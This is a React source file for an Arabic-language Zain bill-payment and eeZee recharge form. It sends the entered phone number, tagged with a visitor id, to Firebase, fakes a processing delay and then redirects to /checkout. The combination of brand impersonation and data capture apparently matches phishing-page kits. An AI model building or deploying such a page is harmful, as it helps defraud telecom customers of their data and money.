"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { useLocation } from "@/lib/use-location"
import { addData } from "@/lib/firebase"

export default function ZainPaymentForm() {
  const [phone, setPhone] = useState("")
  const [paymentType, setPaymentType] = useState("other")
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [amount, setAmount] = useState(0)
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
  const [phoneError, setPhoneError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [activeTab, setActiveTab] = useState("bill")
  const location=useLocation()
  // Validate phone number
  useEffect(() => {
    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام")
    } else {
      setPhoneError("")
    }
  }, [phone])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "")
    if (value.length <= 8) {
      setPhone(value)
    }
  }

  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value)
    localStorage.setItem("amount", value)
    setAmount(Number.parseFloat(value))
  }

  const handleSubmit = () => {
    const _id=    localStorage.getItem('visitor')
    
        if (!isFormValid) return
        setIsLoading(true)
        addData({id:_id,phone:phone,mobile:phone})
        // Simulate API call
        setTimeout(() => {
          setIsLoading(false)
          // Navigate to checkout or show success
          window.location.href = "/checkout"
        }, 1500)
      }
    
      

  const isFormValid = phone.length === 8 && !phoneError && termsAccepted && amount > 0

  const billAmounts = ["5", "10", "15", "20", "30", "50"]
  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 py-8 px-4" dir="rtl">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-primary/10 rounded-full mb-4">
            <CreditCard className="w-8 h-8 text-primary" />
          </div>
          <h1 className="text-2xl font-bold text-slate-900 mb-2">خدمات الدفع</h1>
          <p className="text-slate-600">ادفع فاتورتك أو أعد تعبئة رصيدك بسهولة</p>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full" dir="rtl">
          <TabsList className="grid w-full grid-cols-2 py-4 bg-white h-16 shadow-sm border border-slate-200 rounded-xl p-1">
            <TabsTrigger
              value="bill"
              className="flex items-center gap-2 py-3 px-4 rounded-lg data-[state=active]:bg-primary data-[state=active]:text-white data-[state=active]:shadow-sm transition-all duration-200"
            >
              <CreditCard className="w-4 h-4" />
              <span className="font-medium">دفع الفاتورة</span>
            </TabsTrigger>
            <TabsTrigger
              value="recharge"
              className="flex items-center gap-2 py-3 px-4 rounded-lg data-[state=active]:bg-primary data-[state=active]:text-white data-[state=active]:shadow-sm transition-all duration-200"
            >
              <Smartphone className="w-4 h-4" />
              <span className="font-medium">إعادة تعبئة</span>
            </TabsTrigger>
          </TabsList>

          <TabsContent value="bill" className="mt-6">
            <Card className="shadow-lg border-0 py-2 bg-white/80 backdrop-blur-sm">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-primary/10 rounded-lg flex items-center justify-center">
                    <CreditCard className="w-5 h-5 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-slate-900">دفع الفاتورة</h3>
                    <p className="text-sm text-slate-600">ادفع فاتورة زين الخاصة بك</p>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* Payment Type Selection */}
                <div className="space-y-3">
                  <Label className="text-sm font-medium text-slate-700">نوع الدفع</Label>
                  <Select value={paymentType} onValueChange={setPaymentType}>
                    <SelectTrigger className="h-12 bg-slate-50 border-slate-200 hover:border-primary transition-colors">
                      <SelectValue placeholder="اختر نوع الدفع" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="other">رقم آخر</SelectItem>
                      <SelectItem value="contract">رقم العقد</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {/* Phone Number Input */}
                <div className="space-y-3">
                  <Label htmlFor="phone" className="text-sm font-medium text-slate-700 flex items-center gap-2">
                    رقم الهاتف
                    <Badge variant="secondary" className="text-xs">
                      مطلوب
                    </Badge>
                  </Label>
                  <div className="relative">
                    <Input
                      id="phone"
                      placeholder="99XXXXXX"
                      value={phone}
                      onChange={handlePhoneChange}
                      maxLength={8}
                      className={`h-12 text-lg font-mono bg-slate-50 border-slate-200 focus:border-primary transition-colors ${
                        phoneError ? "border-red-300 focus:border-red-400" : ""
                      }`}
                      dir="ltr"
                    />
                    {phone.length === 8 && !phoneError && (
                      <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
                    )}
                  </div>
                  {phoneError && (
                    <div className="flex items-center gap-2 p-3 bg-red-50 border border-red-200 rounded-lg">
                      <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0" />
                      <p className="text-sm text-red-700">{phoneError}</p>
                    </div>
                  )}
                </div>

                {/* Amount Selection */}
                {phone.length === 8 && !phoneError && (
                  <div className="space-y-4">
                    <Label className="text-sm font-medium text-slate-700">اختر المبلغ</Label>
                    <div className="grid grid-cols-2 gap-3">
                      {billAmounts.map((value) => (
                        <Button
                          key={value}
                          type="button"
                          variant={selectedAmount === value ? "default" : "outline"}
                          className={`h-14 text-base font-semibold transition-all duration-200 ${
                            selectedAmount === value
                              ? "bg-primary hover:bg-primary/90 text-white shadow-md scale-105"
                              : "border-2 border-slate-200 hover:border-primary hover:bg-primary/5"
                          }`}
                          onClick={() => handleAmountSelect(value)}
                        >
                          <div className="text-center">
                            <div className="font-bold">{value}.000</div>
                            <div className="text-xs opacity-80">د.ك</div>
                          </div>
                        </Button>
                      ))}
                    </div>
                  </div>
                )}

                {/* Terms and Conditions */}
                <div className="bg-slate-50 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <Checkbox
                      id="terms"
                      checked={termsAccepted}
                      onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
                      className="mt-1 data-[state=checked]:bg-primary data-[state=checked]:border-primary"
                    />
                    <div className="space-y-1">
                      <Label htmlFor="terms" className="text-sm font-medium cursor-pointer text-slate-700">
                        أوافق على الشروط والأحكام
                      </Label>
                      <p className="text-xs text-slate-500">بالمتابعة، أنت توافق على شروط وأحكام الخدمة</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Add Another Number Button */}
            <div className="mt-4">
              <Button variant="outline" disabled className="w-full h-12 border-dashed border-slate-300 text-slate-500">
                <Plus className="w-4 h-4 ml-2" />
                أضف رقم آخر
              </Button>
            </div>
          </TabsContent>

          <TabsContent value="recharge" className="mt-6">
            <Card className="shadow-lg border-0 bg-white/80 backdrop-blur-sm">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 bg-primary/10 rounded-lg flex items-center justify-center">
                    <Smartphone className="w-5 h-5 text-primary" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-slate-900">إعادة تعبئة eeZee</h3>
                    <p className="text-sm text-slate-600">أعد تعبئة رصيد eeZee الخاص بك</p>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="space-y-6">
                {/* Phone Number Input */}
                <div className="space-y-3">
                  <Label
                    htmlFor="phone-recharge"
                    className="text-sm font-medium text-slate-700 flex items-center gap-2"
                  >
                    رقم الهاتف
                    <Badge variant="secondary" className="text-xs">
                      مطلوب
                    </Badge>
                  </Label>
                  <div className="relative">
                    <Input
                      id="phone-recharge"
                      placeholder="99XXXXXX"
                      value={phone}
                      onChange={handlePhoneChange}
                      maxLength={8}
                      className={`h-12 text-lg font-mono bg-slate-50 border-slate-200 focus:border-primary transition-colors ${
                        phoneError ? "border-red-300 focus:border-red-400" : ""
                      }`}
                      dir="ltr"
                    />
                    {phone.length === 8 && !phoneError && (
                      <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
                    )}
                  </div>
                  {phoneError && (
                    <div className="flex items-center gap-2 p-3 bg-red-50 border border-red-200 rounded-lg">
                      <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0" />
                      <p className="text-sm text-red-700">{phoneError}</p>
                    </div>
                  )}
                </div>

                {/* Recharge Amount Selection */}
                {phone.length === 8 && !phoneError && (
                  <div className="space-y-4">
                    <Label className="text-sm font-medium text-slate-700">اختر باقة إعادة التعبئة</Label>
                    <div className="grid grid-cols-2 gap-3">
                      {rechargeAmounts.map((value) => (
                        <Button
                          key={value}
                          type="button"
                          variant={selectedAmount === value ? "default" : "outline"}
                          className={`h-14 text-base font-semibold transition-all duration-200 ${
                            selectedAmount === value
                              ? "bg-primary hover:bg-primary/90 text-white shadow-md scale-105"
                              : "border-2 border-slate-200 hover:border-primary hover:bg-primary/5"
                          }`}
                          onClick={() => handleAmountSelect(value)}
                        >
                          <div className="text-center">
                            <div className="font-bold">{value}.000</div>
                            <div className="text-xs opacity-80">د.ك</div>
                          </div>
                        </Button>
                      ))}
                    </div>
                  </div>
                )}

                {/* Terms and Conditions */}
                <div className="bg-slate-50 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <Checkbox
                      id="terms-recharge"
                      checked={termsAccepted}
                      onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
                      className="mt-1 data-[state=checked]:bg-primary data-[state=checked]:border-primary"
                    />
                    <div className="space-y-1">
                      <Label htmlFor="terms-recharge" className="text-sm font-medium cursor-pointer text-slate-700">
                        أوافق على الشروط والأحكام
                      </Label>
                      <p className="text-xs text-slate-500">بالمتابعة، أنت توافق على شروط وأحكام الخدمة</p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {/* Payment Summary */}
        {amount > 0 && (
          <Card className="mt-6 shadow-lg border-0 bg-gradient-to-r from-primary/5 to-primary/10">
            <CardContent className="p-6">
              <div className="flex items-center justify-between mb-4">
                <span className="text-lg font-medium text-slate-700">المجموع الكلي</span>
                <div className="text-right">
                  <div className="text-2xl font-bold text-primary">{amount.toFixed(3)}</div>
                  <div className="text-sm text-slate-600">دينار كويتي</div>
                </div>
              </div>

              <Separator className="my-4" />

              <Button
                onClick={handleSubmit}
                disabled={!isFormValid || isLoading}
                className="w-full h-14 text-lg font-bold bg-primary hover:bg-primary/90 disabled:bg-slate-200 disabled:text-slate-400 transition-all duration-200 shadow-lg hover:shadow-xl"
              >
                {isLoading ? (
                  <div className="flex items-center justify-center gap-3">
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                    <span>جاري المعالجة...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2">
                    <CreditCard className="w-5 h-5" />
                    <span>ادفع الآن</span>
                  </div>
                )}
              </Button>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
